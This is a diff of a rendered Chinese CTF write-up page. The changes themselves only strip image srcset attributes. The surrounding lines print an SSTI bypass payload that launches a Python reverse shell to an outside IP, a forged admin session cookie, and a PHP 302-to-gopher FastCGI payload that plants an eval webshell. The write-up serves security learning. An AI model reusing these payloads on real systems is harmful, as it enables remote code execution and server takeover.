@@ -13,7 +13,7 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>scp -P 19793 -r C:\Users\baozhongqi\Desktop\jelly_ctf root@27.25.151.48:/opt
 </span></span></code></pre></td></tr></table></div></div><p>然后compose是在的直接启动就好了，然后我们反编译代码慢慢和人机一起看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>docker compose up 
-</span></span></code></pre></td></tr></table></div></div><p>打开代码一脸懵逼啊，org.apache.commons.jelly.tags.core.ExprTag#doTag方法</p><p><img src=/p/guocheng-cup-2024/QQ20241209-132935.jpg width=1792 height=989 srcset="/p/guocheng-cup-2024/QQ20241209-132935_hu_44c045f61d84e508.jpg 480w, /p/guocheng-cup-2024/QQ20241209-132935_hu_a3b49f874e3d7087.jpg 1024w" loading=lazy alt=1></p><p>就看到这里能写xml，那么也就是打一个xxe了，那么现在我们就要找哪里调用了这个函数</p><p><strong>Edit->find->find in Files</strong>然后发现到处都是</p><p>后来问了花哥，说先看路由就知道了，然后绕过check</p><p><img src=/p/guocheng-cup-2024/QQ20241210-085638.jpg width=1848 height=1282 srcset="/p/guocheng-cup-2024/QQ20241210-085638_hu_6f8b900be4845fb6.jpg 480w, /p/guocheng-cup-2024/QQ20241210-085638_hu_94c65ded191969e3.jpg 1024w" loading=lazy alt=1></p><p>发现这个绕过好像啥东西也没有</p><p>a.dtd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><p>打开代码一脸懵逼啊，org.apache.commons.jelly.tags.core.ExprTag#doTag方法</p><p><img src=/p/guocheng-cup-2024/QQ20241209-132935.jpg width=1792 height=989 loading=lazy alt=1></p><p>就看到这里能写xml，那么也就是打一个xxe了，那么现在我们就要找哪里调用了这个函数</p><p><strong>Edit->find->find in Files</strong>然后发现到处都是</p><p>后来问了花哥，说先看路由就知道了，然后绕过check</p><p><img src=/p/guocheng-cup-2024/QQ20241210-085638.jpg width=1848 height=1282 loading=lazy alt=1></p><p>发现这个绕过好像啥东西也没有</p><p>a.dtd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
@@ -329,7 +329,7 @@
 </span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22role%22%3Bs%3A5%3A%22admin%22%3B%7D-----94846cb0efabd535fb2e222bece2aabc4ca5f98f520b357cb001d2ee00ad8ab1</span>
 </span></span><span class=line><span class=cl><span class=n>sec-fetch-user</span><span class=o>:</span> <span class=l>?1</span>
 </span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
-</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241207-111229.jpg width=933 height=626 srcset="/p/guocheng-cup-2024/QQ20241207-111229_hu_d1e2f550feea3d8a.jpg 480w, /p/guocheng-cup-2024/QQ20241207-111229_hu_809aec24f2e5fcda.jpg 1024w" loading=lazy alt=1></p><p>那么现在绕过这个函数即可，查资料吧那</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241207-111229.jpg width=933 height=626 loading=lazy alt=1></p><p>那么现在绕过这个函数即可，查资料吧那</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>a25e3bbcbb098d51f5c7f712a21b326299c6b6b040d7a01d2a8a77cc3d13b425
 </span></span></code></pre></td></tr></table></div></div><p>放提示了不能打这边，得打文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
@@ -871,7 +871,7 @@
 </span></span><span class=line><span class=cl>    <span class=n>app</span> <span class=o>=</span> <span class=n>main</span><span class=p>()</span>
 </span></span><span class=line><span class=cl>    <span class=n>server</span> <span class=o>=</span> <span class=n>make_server</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=mi>6543</span><span class=p>,</span> <span class=n>app</span><span class=p>)</span>
 </span></span><span class=line><span class=cl>    <span class=n>server</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
-</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241207-131252.jpg width=2007 height=1085 srcset="/p/guocheng-cup-2024/QQ20241207-131252_hu_e97d744d3d30b7b4.jpg 480w, /p/guocheng-cup-2024/QQ20241207-131252_hu_482612731d66ecf7.jpg 1024w" loading=lazy alt=1></p><p>打SSTI，这里要绕过但是发现就是很难绕过，想直接打非预期</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241207-131252.jpg width=2007 height=1085 loading=lazy alt=1></p><p>打SSTI，这里要绕过但是发现就是很难绕过，想直接打非预期</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -1109,7 +1109,7 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{config|attr(&#39;__cl&#39;&#39;ass__&#39;)|attr(&#39;__in&#39;&#39;it__&#39;)|attr(&#39;__glo&#39;&#39;bals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__buil&#39;&#39;tins__&#39;)|attr(&#39;__get&#39;&#39;item__&#39;)(&#39;ev&#39;&#39;al&#39;)(request|attr(&#39;form&#39;)|attr(&#39;get&#39;)(&#39;name&#39;))}}
 </span></span><span class=line><span class=cl>
 </span></span><span class=line><span class=cl>name=__import__(&#39;os&#39;).system(&#39;python3+-c+\&#39;import socket,subprocess,os%3bs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&#34;27.25.151.48&#34;,9999))%3bos.dup2(s.fileno(),0)%3bos.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport pty; pty.spawn(&#34;sh&#34;)\&#39;&#39;)
-</span></span></code></pre></td></tr></table></div></div><p>结果那里面没有成功后来仔细一看代码原来如此</p><p><img src=/p/guocheng-cup-2024/QQ20241210-170529.jpg width=1590 height=868 srcset="/p/guocheng-cup-2024/QQ20241210-170529_hu_38e0afe23d6e9cf9.jpg 480w, /p/guocheng-cup-2024/QQ20241210-170529_hu_20ccfed52b4a5087.jpg 1024w" loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><p>结果那里面没有成功后来仔细一看代码原来如此</p><p><img src=/p/guocheng-cup-2024/QQ20241210-170529.jpg width=1590 height=868 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -1147,7 +1147,7 @@
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[04:27:23] 200 -   12KB - /.index.php.swp                                   
 </span></span><span class=line><span class=cl>[04:27:27] 302 -    0B  - /admin.php  -&gt;  index.php                         
 </span></span><span class=line><span class=cl>[04:27:38] 200 -    4KB - /index.php
-</span></span></code></pre></td></tr></table></div></div><p>然后恢复一下得到</p><p><img src=/p/guocheng-cup-2024/QQ20241210-173813.jpg width=981 height=321 srcset="/p/guocheng-cup-2024/QQ20241210-173813_hu_f1ec349037d7db40.jpg 480w, /p/guocheng-cup-2024/QQ20241210-173813_hu_6918f690f8b13cc9.jpg 1024w" loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><p>然后恢复一下得到</p><p><img src=/p/guocheng-cup-2024/QQ20241210-173813.jpg width=981 height=321 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>vim -r index.php.swp
@@ -1415,7 +1415,7 @@
 </span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Location: index.php&#39;</span><span class=p>);</span>
 </span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
 </span></span><span class=line><span class=cl><span class=p>}</span>
-</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241210-184255.jpg width=937 height=710 srcset="/p/guocheng-cup-2024/QQ20241210-184255_hu_3c43941646d84092.jpg 480w, /p/guocheng-cup-2024/QQ20241210-184255_hu_3782d954341b659.jpg 1024w" loading=lazy alt=1></p><p>https要写一个302跳转的php，但是我不会，哈哈最早接触的时候应该是5月的国赛，其中有一道题也是要打一个302跳转，当时应该也是我问我师父的第一道题但是还是没做，欠着了，现在补上</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guocheng-cup-2024/QQ20241210-184255.jpg width=937 height=710 loading=lazy alt=1></p><p>https要写一个302跳转的php，但是我不会，哈哈最早接触的时候应该是5月的国赛，其中有一道题也是要打一个302跳转，当时应该也是我问我师父的第一道题但是还是没做，欠着了，现在补上</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -1461,7 +1461,7 @@
 </span><span class=lnt>2
 </span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
 </span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location:gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH129%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%81%04%00%3C%3Fphp%20system%28%27echo%20PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs/Pg%3D%3D%7Cbase64%20-d%20%3E%20/var/www/html/shell.php%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&#34;</span><span class=p>);</span>
-</span></span></code></pre></td></tr></table></div></div><p>然后放进去</p><p><img src=/p/guocheng-cup-2024/QQ20241210-191955.jpg width=1493 height=801 srcset="/p/guocheng-cup-2024/QQ20241210-191955_hu_d4f19b62ec188e1e.jpg 480w, /p/guocheng-cup-2024/QQ20241210-191955_hu_ab594b2be4cd5574.jpg 1024w" loading=lazy alt=1></p><p>没那么难配拿下，然后我们打入之后就1为密码就行</p><p><img src=/p/guocheng-cup-2024/QQ20241210-192221.jpg width=1631 height=828 srcset="/p/guocheng-cup-2024/QQ20241210-192221_hu_bfbbe6deee19598f.jpg 480w, /p/guocheng-cup-2024/QQ20241210-192221_hu_db351c780a34aabf.jpg 1024w" loading=lazy alt=1></p><p>根目录下面是假的我们提权看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></span></code></pre></td></tr></table></div></div><p>然后放进去</p><p><img src=/p/guocheng-cup-2024/QQ20241210-191955.jpg width=1493 height=801 loading=lazy alt=1></p><p>没那么难配拿下，然后我们打入之后就1为密码就行</p><p><img src=/p/guocheng-cup-2024/QQ20241210-192221.jpg width=1631 height=828 loading=lazy alt=1></p><p>根目录下面是假的我们提权看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
 </span><span class=lnt>2
 </span><span class=lnt>3
 </span><span class=lnt>4
